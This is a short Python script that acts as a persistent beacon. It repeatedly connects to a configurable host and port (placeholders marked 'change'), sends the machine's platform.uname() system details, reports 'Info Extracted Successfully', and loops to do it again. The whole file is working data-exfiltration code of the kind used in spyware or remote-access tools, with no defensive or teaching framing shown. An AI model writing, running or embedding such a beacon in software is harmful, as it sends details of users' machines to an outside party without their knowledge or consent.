import socket
import platform

ADDR = "127.0.0.1"		 # change	
PORT = 8080      		 # change

def connect():
	print("Connecting....")
	conn = s.connect_ex((ADDR, PORT))
	while conn != 0:
		conn = s.connect_ex((ADDR, PORT))
	print("Connected!")
	return 0

def main():
	if connect() == 0:
		if s.sendall(str(platform.uname()).encode()) is None:
			print("Info Extracted Successfully")
			s.close()
			return
	else:
		connect()


if __name__ == '__main__':
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		main()
		print("Waiting for new connection...")
